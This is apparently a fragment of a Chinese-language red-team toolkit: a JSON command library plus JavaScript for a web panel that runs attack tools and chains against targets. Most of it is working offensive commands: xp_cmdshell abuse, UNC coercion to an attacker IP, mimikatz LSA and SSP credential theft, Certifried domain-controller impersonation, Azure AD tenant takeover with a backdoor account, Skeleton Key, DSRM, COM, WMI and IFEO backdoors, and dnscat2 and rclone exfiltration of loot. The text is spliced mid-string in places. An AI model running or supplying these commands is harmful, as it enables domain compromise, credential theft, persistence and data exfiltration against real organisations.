shell:第一条命令永远是看身份 =====", "n": "", "lang": "sql"}, {"c": "EXEC xp_cmdshell 'whoami';", "n": "", "lang": "sql"}, {"c": "-- 返回 NT SERVICE\\MSSQLSERVER = 本地服务账户(先 Potato 提权见 07);", "n": "", "lang": "sql"}, {"c": "-- 返回 <域名>\\SQL服务账户 = 域账户,直接是域立足点(下一节重点)", "n": "", "lang": "sql"}, {"c": "EXEC xp_cmdshell 'whoami /priv';   -- 看 SeImpersonatePrivilege(Potato 前提)/ SeAssignPrimaryToken", "n": "", "lang": "sql"}, {"c": "-- ===== 复位(用完还原,OPSEC)=====", "n": "", "lang": "sql"}, {"c": "EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;", "n": "", "lang": "sql"}, {"c": "EXEC sp_configure 'show advanced options', 0; RECONFIGURE;", "n": "", "lang": "sql"}]}, {"h": "域凭据提取 — 服务账户票据、LSA Secrets、错误日志与 UNC 回连", "src": "存储过程(xp_dirtree/sp_readerrorlog 为官方对象)+ mimikatz(~/tools/windows/mimikatz/x64/mimikatz.exe,详见 13)+ nxc(本机源码核实 --sam/--lsa 实现)", "cmds": [{"c": "-- ===== 1. UNC 回连抓服务账户 NetNTLM(不需要任何主机权限)=====", "n": "", "lang": "sql"}, {"c": "-- 让 SQL 服务账户向攻击机发起 SMB 认证;攻击机先跑 responder 抓挑战(破解见 04)", "n": "", "lang": "sql"}, {"c": "EXEC master..xp_dirtree '\\\\<攻击机IP>\\share';", "n": "", "lang": "sql"}, {"c": "-- 平替:EXEC master..xp_fileexist '\\\\<攻击机IP>\\share\\1.txt';nxc 侧等价模块:-M mssql_coerce", "n": "", "lang": "sql"}, {"c": "-- 服务账户是域账户时,NTLM 挑战=域账户凭据指纹;是机器账户时确认 SPN 可 Kerberoast", "n": "", "lang": "sql"}, {"c": "sudo impacket-Responder -I eth0 -v", "n": "攻击机配合(抓到 NetNTLM hash 喂 hashcat -m 5600,见 04)", "lang": "bash"}, {"c": "-- ===== 2. sysadmin 读得到的:错误日志(默认审计级别=仅失败登录,全在里面)=====", "n": "", "lang": "sql"}, {"c": "-- 参数:0=当前日志文件,1=SQL Server 日志(2=Agent),第三参=过滤词", "n": "", "lang": "sql"}, {"c": "EXEC sp_readerrorlog 0, 1, 'Login failed';", "n": "", "lang": "sql"}, {"c": "-- 换过滤词挖情报:'error'、'starting' 版本与服务账户、'Audit' 审计事件", "n": "", "lang": "sql"}, {"c": "EXEC sp_readerrorlog 0, 1, 'starting';", "n": "", "lang": "sql"}, {"c": ":::: ===== 3. SQL 服务账户的明文密码藏在 LSA Secrets(域服务账户场景的主路线)=====", "n": "", "lang": "bat"}, {"c": ":::: 服务以域账户注册时,SCM 把密码存进 LSA Secrets,_SC_<服务名> 键(MSSQLSERVER 为默认实例服务名)", "n": "", "lang": "bat"}, {"c": ":::: 先经 xp_cmdshell/提权拿到 SYSTEM(07),再上 mimikatz:", "n": "", "lang": "bat"}, {"c": "C:\\Temp\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::secrets\" \"exit\"", "n": "", "lang": "bat"}, {"c": ":::: 输出里找 _SC_MSSQLSERVER 段 → 服务的域账户明文密码 → 直接认证/接管 SPN", "n": "", "lang": "bat"}, {"c": ":::: 命名实例服务名形如 MSSQL$<实例名>;其他 SQL 相关服务(SQLAgent、SSIS)同理各有 _SC_ 键", "n": "", "lang": "bat"}, {"c": ":::: ===== 4. 服务账户票据:在 sqlservr.exe 自己进程空间,不在 lsass =====", "n": "", "lang": "bat"}, {"c": ":::: mimikatz sekurlsa 系列只解析 lsass,别拿 sqlservr.dmp 喂它;正确姿势:", "n": "", "lang": "bat"}, {"c": ":::: SYSTEM 权限转储 sqlservr.exe 后离线分析(procdump/comsvcs MiniDump 见 07/13)", "n": "", "lang": "bat"}, {"c": "procdump -accepteula -ma sqlservr.exe C:\\Temp\\sql.dmp", "n": "", "lang": "bat"}, {"c": ":::: sql.dmp 拖回攻击机:pypykatz/离线内存搜服务账户 TGT 或密钥;票据拿去 12 号的 pass-the-ticket", "n": "", "lang": "bat"}, {"c": "nxc mssql <目标IP> -u sa -p '<密码>' --sam", "n": "导出本地 SAM 哈希(reg save HKLM\\SAM/SYSTEM 回传解析)", "lang": "bash"}, {"c": "nxc mssql <目标IP> -u sa -p '<密码>' --lsa", "n": "导出 LSA Secrets(reg save HKLM\\SECURITY 回传解析)", "lang": "bash"}]}, {"h": "链接服务器与横向 — OPENQUERY / EXECUTE AT 链式打穿多台 MSSQL", "src": "sys.servers/sys.linked_logins 目录视图与 OPENQUERY/EXECUTE AT 语法(微软官方对象;mssqlclient use_link 与 nxc exec_on_link/link_xpcmd 模块选项本机源码核实)", "cmds": [{"c": "-- ===== 枚举链接(等价内置命令 enum_links / nxc -M enum_links)=====", "n": "", "lang": "sql"}, {"c": "EXEC sp_linkedservers;", "n": "", "lang": "sql"}, {"c": "-- 看每个链接用什么身份连远端:remote_name 是远端登录名,uses_self_credential=1 表示沿用本会话身份", "n": "", "lang": "sql"}, {"c": "SELECT ss.name AS 链接名, ss.data_source AS 远端, ss.is_linked,", "n": "", "lang": "sql"}, {"c": "sl.remote_name AS 远端登录, sl.uses_self_credential AS 沿用自身凭据", "n": "", "lang": "sql"}, {"c": "FROM sys.servers ss", "n": "", "lang": "sql"}, {"c": "LEFT JOIN sys.linked_logins sl ON ss.server_id = sl.server_id;", "n": "", "lang": "sql"}, {"c": "-- ===== 在远端执行查询:OPENQUERY(只需链接存在;查 SYSTEM_USER 看以谁的身份在远端跑)=====", "n": "", "lang": "sql"}, {"c": "SELECT * FROM OPENQUERY(<链接名>, 'SELECT SYSTEM_USER AS 远端身份, IS_SRVROLEMEMBER(''sysadmin'') AS 远端sysadmin');", "n": "", "lang": "sql"}, {"c": "-- 远端是 sysadmin →  {"c": "python3 ~/tools/src/PetitPotam/PetitPotam.py -d <域名> -u '<用户>' -p '<密码>' <本机IP> <目标机IP>", "n": "经典 PetitPotam", "lang": "bash"}, {"c": "impacket-rpcdump -u '<用户>@<域名>' -p '<密码>' <目标机IP> | grep -i 'MS-RPRN\\|MS-EVEN'", "n": "先探测目标有没有可打的认证强制器", "lang": "bash"}]}, {"h": "ESC14 — 证书模板名称碰撞/弱映射变体(certipy find 已内置检测)", "src": "", "cmds": [{"c": "certipy find -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -vulnerable -stdout | sed -n '/ESC14/,$p'", "n": "枚举并直接翻到 ESC14 判定段(-stdout 文本模式必加,见下)", "lang": "bash"}, {"c": "grep -A 20 'ESC14' adcs_Certipy.txt", "n": "离线翻找上一次 find 的文本输出", "lang": "bash"}, {"c": "certipy req -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -template '<命中模板名>' -upn 'administrator@<域名>'", "n": "路线一:碰撞模板可自填 SAN → 同 ESC1 姿势冒充", "lang": "bash"}, {"c": "certipy account -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -user '<可控账户>' -upn 'administrator@<域名>'", "n": "路线二:改账户属性制造弱映射碰撞(altSecurityIdentities 思路)", "lang": "bash"}]}, {"h": "Certifried(CVE-2022-26923)— 机器账户 dNSHostName 篡改,Machine 模板证书冒充域控", "src": "", "cmds": [{"c": "impacket-addcomputer '<域名>/<用户>:<密码>' -computer-name 'EVIL$' -computer-pass '<新机器密码>' -dc-ip <DC的IP>", "n": "第一步:创建机器账户(impacket 已装 /usr/bin/impacket-addcomputer)", "lang": "bash"}, {"c": "python3 - <<'EOF'", "n": "第二步:改 dNSHostName 为域控 FQDN(python/ldap3 思路;PowerView 等价命令见下)", "lang": "bash"}, {"c": "from ldap3 import Server, Connection, ALL, MODIFY_REPLACE", "n": "", "lang": "bash"}, {"c": "c = Connection(Server('<DC的IP>', get_info=ALL), user='<域名>\\\\<用户>', password='<密码>', authentication='NTLM')", "n": "", "lang": "bash"}, {"c": "c.bind()", "n": "", "lang": "bash"}, {"c": "dn = 'CN=EVIL,CN=Computers,DC=<域>,DC=<本地>'", "n": "", "lang": "bash"}, {"c": "c.modify(dn, {'servicePrincipalName': [(MODIFY_REPLACE, [])]})", "n": "先清 SPN,否则 dNSHostName 改成 DC FQDN 会撞 SPN 唯一性报错", "lang": "bash"}, {"c": "c.modify(dn, {'dNSHostName': [(MODIFY_REPLACE, ['<DC主机名>.<域名>'])]})", "n": "冒充域控", "lang": "bash"}, {"c": "print(c.result)", "n": "", "lang": "bash"}, {"c": "EOF", "n": "", "lang": "bash"}, {"c": "certipy req -u '<域名>/EVIL$' -p '<新机器密码>' -dc-ip <DC的IP> -ca '<CA名>' -template Machine", "n": "产出 evil.pfx,SAN=<DC主机名>.<域名>", "lang": "bash"}, {"c": "certipy auth -pfx evil.pfx -dc-ip <DC的IP>", "n": "PKINIT + UnPAC-the-hash:直接输出域控机器账户 NT 哈希", "lang": "bash"}, {"c": "nxc smb <DC的IP> -u 'DC机器名$' -H '<上一步NT哈希>' --dc-ip <DC的IP>", "n": "验证战果;DC 机器账户可直接 DCSync(12 号文档)", "lang": "bash"}]}, {"h": "Windows LAPS v2(msLAPS-EncryptedPassword)— 新版本地管理员密码的读取与解密", "src": "", "cmds": [{"c": "nxc ldap <DC的IP> -u '<用户>' -p '<密码>' -d <域名> -M laps", "n": "拉取当前账号有权读的所有 LAPS 密码(v2 自动解密)", "lang": "bash"}, {"c": "nxc ldap <DC的IP> -u '<用户>' -p '<密码>' -d <域名> -M laps -o COMPUTER='WIN-*'", "n": "模块选项 COMPUTER:按机器名过滤,支持通配符(源码实测 options 只此一项,默认 *)", "lang": "bash"}, {"c": "nxc ldap <DC的IP> -u '<用户>' -p '<密码>' -d <域名> -M laps -k --kdcHost <DC主机名>.<域名>", "n": "Kerberos 认证姿势(GKDI 解密同样走 Kerberos)", "lang": "bash"}, {"c": "ldapsearch -x -H ldap://<DC的IP> -D '<用户>@<域名>' -w '<密码>' \\", "n": "手工 ldapsearch:先看属性有没有值、是哪种模式(解密再交给 nxc 或手工链路)", "lang": "bash"}, {"c": "-b 'DC=<域>,DC=<本地>' '(&(objectCategory=computer)(|(msLAPS-EncryptedPassword=*)(msLAPS-Password=*)(ms-MCS-AdmPwd=*)))' \\", "n": "", "lang": "bash"}, {"c": "name msLAPS-EncryptedPassword msLAPS-Password ms-MCS-AdmPwd", "n": "三个属性一起查,一次分清版本与加密模式", "lang": "bash"}]}, {"h": "UnPAC-the-hash — 从 PAC 里直接掏 NT 哈希(证书/哈希免 NTLM 互换)", "src": "", "cmds": [{"c": "certipy auth -pfx <证书>.pfx -dc-ip <DC的IP>", "n": "一条龙:PKINIT 拿 TGT + 自动 UnPAC-the-hash,直接输出 NT 哈希并保存 <账户>.ccache(本机 v5.1.0 默认行为)", "lang": "bash"}, {"c": "certipy auth -pfx evil.pfx -dc-ip <DC的IP> -kirbi", "n": "同上,票据另存 Rubeus/mimikatz 的 kirbi 格式", "lang": "bash"}, {"c": "KRB5CCNAME=<账户>.ccache nxc smb <目标IP> -u '<账户>' --use-kcache", "n": "哈希/票据任选一路横向(见 10 号文档)", "lang": "bash"}]}, {"h": "Seamless SSO / Azure AD Connect — DCSync AZUREADSSOACC$,伪造云会话接管租户", "src": "", "cmds": [{"c": "Import-Module .\\AADInternals.psm1", "n": "第二步:AADInternals 伪造云会话(需一台能连本地 KDC 的 Windows 跳板,模块在 ~/tools/src/AADInternals)", "lang": "powershell"}, {"c": "$passwd = ConvertTo-SecureString '<AZUREADSSOACC的NT哈希>' -AsPlainText -Force", "n": "RC4 密钥即 NT 哈希,按明文口令形式传入", "lang": "powershell"}, {"c": "$creds  = New-Object System.Management.Automation.PSCredential('<域名>\\AZUREADSSOACC$', $passwd)", "n": "", "lang": "powershell"}, {"c": "$kerberos_token = Invoke-AADIntKerberosInteraction -Domain <域名> -Credentials $creds -KerberosTokenFormat Raw", "n": "向本地 KDC 申请 AZUREADSSOACC$ 的 Kerberos 票据", "lang": "powershell"}, {"c": "$at = Get-AADIntAccessTokenForMSGraph -KerberosToken $kerberos_token -IncludeRefreshToken $true", "n": "票据换 MS Graph 访问令牌 + 刷新令牌", "lang": "powershell"}, {"c": "Get-AADIntUsers -AccessToken $at | Format-Table UserPrincipalName,DisplayName", "n": "枚举云用户,确认接管面(找同步上来的管理员)", "lang": "powershell"}, {"c": "Set-AADIntUserPassword -AccessToken $at -UserPrincipalName '<同步管理员的UPN>' -Password '<新密码>'", "n": "重置同步管理员密码 → 租户接管(纯云账户不受此路影响)", "lang": "powershell"}, {"c": "New-AADIntUser -AccessToken $at -UserPrincipalName 'backup@<租户域名>' -Password '<密码>' -DisplayName 'svc-backup'", "n": "或直接留一个云后门账户", "lang": "powershell"}]}, {"h": "新旧打法对照表", "src": "", "cmds": []}]}, {"file": "17-Windows持久化.md", "title": "Windows 持久化", "sections": [{"h": "Skeleton Key 骨架钥匙 — 域控内存注入万能密码(misc::skeleton)", "src": "", "cmds": [{"c": ":::: DC 上(需本地管理员,最好 SYSTEM):先送 mimikatz 上去再运行", "n": "", "lang": "bat"}, {"c": "C:\\Temp\\mimikatz.exe", "n": "", "lang": "bat"}, {"c": "privilege::debug", "n": "先拿 SeDebugPrivilege", "lang": "bash"}, {"c": "misc::skeleton", "n": "给本机 LSASS 注入骨架钥匙;无 ERROR 行即成功生效", "lang": "bash"}, {"c": "nxc smb <DC的IP> -u <任意域用户> -p mimikatz", "n": "攻击机:任意域用户 + 万能密码 mimikatz 即可通过该 DC 认证(验证也是这条)", "lang": "bash"}, {"c": ":::: 无在线摘除手段——补丁在 LSASS 内存,重启 DC 即失效(重启动作留 6005/6006 事件)", "n": "", "lang": "bat"}, {"c": "shutdown /r /t 0", "n": "", "lang": "bat"}]}, {"h": "DSRM 后门 — 重置域控本地管理员密码 + 放开网络登录", "src": "", "cmds": [{"c": ":::: 1. 重置 DSRM 密码(DC 上管理员 cmd;输入不回显;\"on server null\"=本机)", "n": "", "lang": "bat"}, {"c": "ntdsutil", "n": "", "lang": "bat"}, {"c": "set dsrm password", "n": "", "lang": "bat"}, {"c": "reset password on server null", "n": "", "lang": "bat"}, {"c": "<新DSRM密码>", "n": "", "lang": "bat"}, {"c": "<重复输入一遍>", "n": "", "lang": "bat"}, {"c": "q", "n": "", "lang": "bat"}, {"c": "q", "n": "", "lang": "bat"}, {"c": ":::: 变体:把 DSRM 密码同步成某域账户的密码(该域账户哈希你已有,免再记一套):", "n": "", "lang": "bat"}, {"c": "::::   ntdsutil 交互内:set dsrm password → sync from domain account samaccount <域用户> → q → q", "n": "", "lang": "bat"}, {"c": ":::: 2. 放开 DSRM 网络登录(默认 0 只允许 DC 本地控制台;2 = 正常运行模式下也允许网络登录)", "n": "", "lang": "bat"}, {"c": "reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f", "n": "", "lang": "bat"}, {"c": "nxc smb <DC的IP> -u administrator -H <DSRM的NTLM哈希> --local-auth", "n": "用本地账户语义打 DC(--local-auth 关键,否则走域验证):", "lang": "bash"}, {"c": ":::: 1. 注册表改回默认(或直接删值,默认即 0)", "n": "", "lang": "bat"}, {"c": "reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 0 /f", "n": "", "lang": "bat"}, {"c": "reg delete HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DSRMAdminLogonBehavior /f", "n": "", "lang": "bat"}, {"c": ":::: 2. 再进 ntdsutil 重置一次 DSRM 密码(换成只有客户知道的新值,见上进入命令同流程)", "n": "", "lang": "bat"}]}, {"h": "COM 劫持 — HKCU 覆盖 CLSID 指向自 DLL(免管理员)", "src": "", "cmds": [{"c": ":::: 1. 先查原 HKLM 值留档(回滚用):任意 CLSID 皆可劫持,挑常被实例化的", "n": "", "lang": "bat"}, {"c": "reg query HKCR\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\\InprocServer32 /ve", "n": "", "lang": "bat"}, {"c": ":::: 2. HKCU 下建同名键指向自 DLL(不需要管理员;ThreadingModel 跟原值走,通常 Apartment)", "n": "", "lang": "bat"}, {"c": "reg add HKCU\\Software\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\\InprocServer32 /ve /t REG_SZ /d \"C:\\Temp\\evil.dll\" /f", "n": "", "lang": "bat"}, {"c": "reg add HKCU\\Software\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\\InprocServer32 /v ThreadingModel /t REG_SZ /d \"Apartment\" /f", "n": "", "lang": "bat"}, {"c": ":::: 整键删除即还原(HKLM 原值从未被动过)", "n": "", "lang": "bat"}, {"c": "reg delete HKCU\\Software\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7} /f", "n": "", "lang": "bat"}, {"c": "del C:\\Temp\\evil.dll", "n": "", "lang": "bat"}]}, {"h": "WMI 事件订阅 — 无文件三件套永久驻留(__EventFilter + Consumer + Binding)", "src": "", "cmds": [{"c": "$F = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments `", "n": "1. 过滤器:开机 4~5 分钟窗口触发一次(WQL 每 60 秒轮询 SystemUpTime)", "lang": "powershell"}, {"c": "@{Name='SysmonHelper'; EventNamespace='root\\CimV2'; QueryLanguage='WQL';", "n": "", "lang": "powershell"}, {"c": "Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 305\"}", "n": "", "lang": "powershell"}, {"c": "$C = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments `", "n": "2. 消费者:执行命令(由 WmiPrvSE.exe 以 SYSTEM 跑)", "lang": "powershell"}, {"c": "@{Name='SysmonHelper'; CommandLineTemplate='C:\\Windows\\System32\\cmd.exe /c C:\\Temp\\evil.exe'}", "n": "", "lang": "powershell"}, {"c": "Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$F; Consumer=$C}", "n": "3. 绑定两者(缺这步不生效)", "lang": "powershell"}, {"c": "Get-CimInstance root\\subscription -ClassName __FilterToConsumerBinding | Remove-CimInstance", "n": "反向三连(先拆绑定,再删过滤器与消费者;Name 换成你装的)", "lang": "powershell"}, {"c": "Get-CimInstance root\\subscription -ClassName __EventFilter -Filter \"Name='SysmonHelper'\" | Remove-CimInstance", "n": "", "lang": "powershell"}, {"c": "Get-CimInstance root\\subscription -ClassName CommandLineEventConsumer -Filter \"Name='SysmonHelper'\" | Remove-CimInstance", "n": "", "lang": "powershell"}]}, {"h": "SSP 注入 — 登录明文落盘(misc::memssp 内存版 / mimilib.dll 持久版)", "src": "", "cmds": [{"c": "privilege::debug", "n": "=== 内存版:进入 mimikatz 后执行(管理员 + 先提权)===", "lang": "bash"}, {"c": "misc::memssp", "n": "LSASS 内存打补丁注入伪 SSP;不写盘,重启失效", "lang": "bash"}, {"c": "type C:\\Windows\\System32\\kiwissp.log", "n": "这是 shell 命令,退出 mimikatz 后看", "lang": "bash"}, {"c": ":::: 持久版(需管理员;重启存活):DLL 丢 System32 + 注册进 LSA 安全包清单", "n": "", "lang": "bat"}, {"c": "copy C:\\Temp\\mimilib.dll C:\\Windows\\System32\\mimilib.dll", "n": "", "lang": "bat"}, {"c": ":::: 关键:Security Packages 是多字符串值,先查原值抄全,只在末尾追加 mimilib,别凭记忆重写", "n": "", "lang": "bat"}, {"c": "reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v \"Security Packages\"", "n": "", "lang": "bat"}, {"c": ":::: 用查到的原值(如 kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u)整体重写并加 \\0mimilib:", "n": "", "lang": "bat"}, {"c": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v \"Security Packages\" /t REG_MULTI_SZ /d \"kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0mimilib\" /f", "n": "", "lang": "bat"}, {"c": ":::: 重启后生效;此后登录明文进 C:\\Windows\\System32\\kiwissp.log", "n": "", "lang": "bat"}, {"c": ":::: 内存版:重启即消失(shutdown /r /t 0),无其他清理", "n": "", "lang": "bat"}, {"c": ":::: 持久版:还原注册表(按进入前抄下的原值重写)+ 删文件 + 再重启", "n": "", "lang": "bat"}, {"c": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v \"Security Packages\" /t REG_MULTI_SZ /d \"<原多字符串值,如 kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u>\" /f", "n": "", "lang": "bat"}, {"c": "del C:\\Windows\\System32\\mimilib.dll", "n": "", "lang": "bat"}, {"c": "del C:\\Windows\\System32\\kiwissp.log", "n": "", "lang": "bat"}, {"c": "shutdown /r /t 0", "n": "", "lang": "bat"}]}, {"h": "IFEO 劫持 — Image File Execution Options Debugger 粘滞键后门", "src": "", "cmds": [{"c": ":::: 粘滞键后门(需管理员):锁屏/登录界面按 5 次 Shift → 启动的是你的 exe", "n": "", "lang": "bat"}, {"c": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\Temp\\evil.exe\" /f", "n": "", "lang": "bat"}, {"c": ":::: 变体:Win+U 的轻松访问(utilman.exe  DNS 隧道渗出(服务端/客户端 -h 全实测)", "src": "apt 包 dnscat2。本机事实:`/usr/bin/dnscat2-server` 是 64 字节包装脚本,内容为 `sudo ruby /usr/share/dnscat2/dnscat2.rb \"$@\"`(实测 cat)——绑 53 要 root,`-h` 直跑 `ruby /usr/share/dnscat2/dnscat2.rb` 实测;Linux 客户端 `/usr/bin/dnscat -h` 实测。Windows 侧客户端(dnscat.exe)官方仓库只给源码,需自行交叉编译,参数与 Linux 客户端同款(`--dns domain=...` 一套),落地方式走 13(SMB/base64 写入),别虚构现成 exe。", "cmds": [{"c": "sudo dnscat2-server exfil.example.com", "n": "默认 0.0.0.0:53,监听指定域", "lang": "bash"}, {"c": "sudo dnscat2-server --dns 'host=0.0.0.0,port=5353,domain=a.com,domain=b.com'", "n": "换端口/多域名", "lang": "bash"}, {"c": "sudo dnscat2-server -c <预共享密钥> exfil.example.com", "n": "强制认证(-e authenticated 默认随 -c 生效)", "lang": "bash"}, {"c": "dnscat --dns domain=exfil.example.com,server=<攻击机IP>", "n": "基本回连", "lang": "bash"}, {"c": "dnscat --dns domain=exfil.example.com,server=<IP>,type=TXT", "n": "指定记录类型(默认 TXT,CNAME,MX)", "lang": "bash"}, {"c": "dnscat --ping --dns domain=exfil.example.com", "n": "只探测服务端在不在", "lang": "bash"}, {"c": "dnscat --secret <预共享密钥> --dns domain=exfil.example.com", "n": "与服务端 -c 配对加密认证", "lang": "bash"}]}, {"h": "rclone — 加密云盘中转:配置远程一条流 + serve 本机中转(v1.75.1 实测)", "src": "`~/tools/bin/rclone` v1.75.1(`-h`/`version` 本机实测)。思路:目标→云盘、攻击机→云盘,两段合法 HTTPS,中间不暴露 C2 基础设施;crypt 层保证云盘上也是密文,账号被查也只见乱码。", "cmds": [{"c": "~/tools/bin/rclone config create od webdav url=https://dav.example.com vendor=other user=<用户> pass=<密码>", "n": "===== 一条流配置远程(config create 实测;密码字段自动 obscure 落盘)=====", "lang": "bash"}, {"c": "~/tools/bin/rclone config create odc crypt remote=od:loot password=<加密口令> filename_encryption=standard directory_name_encryption=true", "n": "远程类型按目标换:webdav/sftp/ftp/s3/drive 等(serve -h 同套类型);OAuth 类需 --non-interactive 走 JSON 应答", "lang": "bash"}, {"c": "~/tools/bin/rclone copy ~/tools/loot odc:2026-xx --bwlimit 500k -P", "n": "--bwlimit 实测:KiB/s 或 B|K|M|G|T|P,支持时段表", "lang": "bash"}, {"c": "~/tools/bin/rclone ls odc:2026-xx", "n": "校验远端清单", "lang": "bash"}, {"c": "~/tools/bin/rclone serve ht function copy(btn, text){
  const done = () => { btn.textContent='已复制'; btn.classList.add('ok'); setTimeout(()=>{btn.textContent='复制';btn.classList.remove('ok')},1200); toast(); };
  if (navigator.clipboard) navigator.clipboard.writeText(text).then(done).catch(()=>fb());
  else fb();
  function fb(){ const t=document.createElement('textarea'); t.value=text; document.body.appendChild(t); t.select(); document.execCommand('copy'); t.remove(); done(); }
}

  return `<div class="cmd" ${hit(FQ)?'':'style="display:none"'}>
    <span class="srcdoc">${esc((c.doc||'').replace('.md',''))}${c.sec?' · '+esc(c.sec.split('—')[0].trim().slice(0,18)):''}</span>
    <code>${hl(esc(c.c))}${c.n?`<span class="note"> — ${hl(esc(c.n))}</span>`:''}</code>
    <button class="cp" onclick="copy(this,this.previousElementSibling.getAttribute('data-raw')||this.closest('.cmd').querySelector('code').textContent)">复制</button>
  </div>`;
}
const $ = s => document.querySelector(s);
let FQ = '';
function hl(s){ if(!FQ) return s; const r=new RegExp('('+FQ.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+')','gi'); return s.replace(r,'<span class="hl">$1</span>'); }

  if(!CUR){ const tmult = (TOOLS.net_timeout_mult && TOOLS.net_timeout_mult !== 1) ? ` · ⏱超时×${esc(String(TOOLS.net_timeout_mult))}(netcheck 实测)` : '';
    let h='<p class="meta">选工具/链 → 填参数 → 预览 → 运行。🔗=多步链(产物自动接续) · 🟥高危 · Ⓟ项目预填'+tmult+'</p><div class="grid">';

      h+=`<div class="card"><h4>${esc(st)}</h4>`+byStage[st].map(t=>{

  const c=(window.CHAINS||[]).find(x=>x.id===id); CUR={chain:c};

  const sv=savedParams();

async function execChain(){
  const c=CUR.chain, out=$('#out');
  const params={}; (c.params||[]).forEach(p=>params[p.k]=document.querySelector('#c_'+p.k)?.value||'');
  const sudo_pass=document.querySelector('#p__sudo')?.value||'';
  try{ const k='redops-params'+(window.PROJ?'/'+window.PROJ.name:''); localStorage.setItem(k, JSON.stringify({...savedParams(), ...params})); }catch(e){}
  out.innerHTML=`<p class="meta">⏳ 链执行中(${c.steps.length} 步,逐步回显)…</p>`;
  try{
    const body=JSON.stringify({id:c.id,params,sudo_pass,proxy:document.querySelector('#useproxy')?.checked?1:0});
    const resp=await api('/api/chain',{method:'POST',headers:{'Content-Type':'application/json'},body});
    const r=await resp.json();
    if(resp.status===409 && r.need_confirm){ confirmRetry(out, r, '/api/chain', body, renderChainResult); return; }  // confirm 一键重试
    renderChainResult(out, r);
  }catch(e){ out.innerHTML='<pre style="color:#ff9aa2">请求失败: '+esc(e.message)+'</pre>'; }
}
function renderChainResult(out, r){
  if(r.error){ out.innerHTML=`<pre style="color:#ff9aa2">${esc(r.error)}</pre>`; return; }
  let h=`<p class="meta">产物:<code>${esc(String(r.dir||''))}</code>${r.generated?` · <b style="color:#ffb86c">自动生成:</b> ${Object.entries(r.generated).map(([k,v])=>`${esc(k)}=<code>${esc(v)}</code>`).join(' ')}`:''}</p>`;
  (r.steps||[]).forEach(s=>{ h+=`<p class="meta" style="margin-top:10px">${s.rc===0?'✅':(s.rc===-1?'⏱':'⚠️')} <b>${esc(s.step)}</b> rc=${s.rc}</p><pre style="background:var(--panel2);border:1px solid var(--line);border-radius:8px;padding:8px;max-height:200px;overflow:auto;font-size:12px">${colorOut(s.out||'(无输出)')}</pre>`; });
  out.innerHTML=h;
}

async function execTool(){
  const t=CUR, out=$('#out');
  if(t.danger && !confirm('高危操作: '+t.name+'\n目标操作将真实执行,确认?')) return;
  const params={}; (t.params||[]).forEach(p=>params[p.k]=document.querySelector('#p_'+p.k)?.value||'');
  const sudo_pass=document.querySelector('#p__sudo')?.value||'';
  const proxy=document.querySelector('#useproxy')?.checked?1:0;
  try{ const k='redops-params'+(window.PROJ?'/'+window.PROJ.name:''); localStorage.setItem(k, JSON.stringify({...savedParams(), ...params})); }catch(e){}
  if(document.querySelector('#p__multi')?.checked){  // 多目标模式 → /api/run_multi(逐台后台)
    const tk=targetKey(t);
    const targets=(document.querySelector('#pm_'+tk)?.value||'').split('\n').map(s=>s.trim()).filter(Boolean);
    if(!targets.length){ out.innerHTML='<pre style="color:#ff9aa2">多目标模式:请在文本框每行填写一个目标</pre>'; return; }
    out.innerHTML=`<p class="meta">⏳ 批量启动 ${targets.length} 个目标…</p>`;
    try{
      const body=JSON.stringify({id:t.id,targets,params,sudo_pass,proxy});
      const resp=await api('/api/run_multi',{method:'POST',headers:{'Content-Type':'application/json'},body});
      const r=await resp.json();
      if(resp.status===409 && r.need_confirm){ confirmRetry(out, r, '/api/run_multi', body, renderMultiResult); return; }  // confirm 一键重试
      renderMultiResult(out, r);
    }catch(e){ out.innerHTML='<pre style="color:#ff9aa2">请求失败: '+esc(e.message)+'</pre>'; }
    return;
  }
  out.innerHTML=`<p class="meta">⏳ 执行中…(超时 ${t.timeout||120}s${proxy?' · proxychains4':''})</p>`;
  try{
    const body=JSON.stringify({id:t.id,params,sudo_pass,proxy});
    const resp=await api('/api/run',{method:'POST',headers:{'Content-Type':'application/json'},body});
    const r=await resp.json();
    if(resp.status===409 && r.need_confirm){ confirmRetry(out, r, '/api/run', body, renderRunResult); return; }  // confirm 一键重试
    renderRunResult(out, r);
  }catch(e){ out.innerHTML='<pre style="color:#ff9aa2">请求失败: '+esc(e.message)+'</pre>'; }
}
function renderMultiResult(out, r){  // 批量结果:dir → 已启动;skipped → 原因
  if(r.error){ out.innerHTML=`<pre style="color:#ff9aa2">${esc(r.error)}</pre>`; return; }
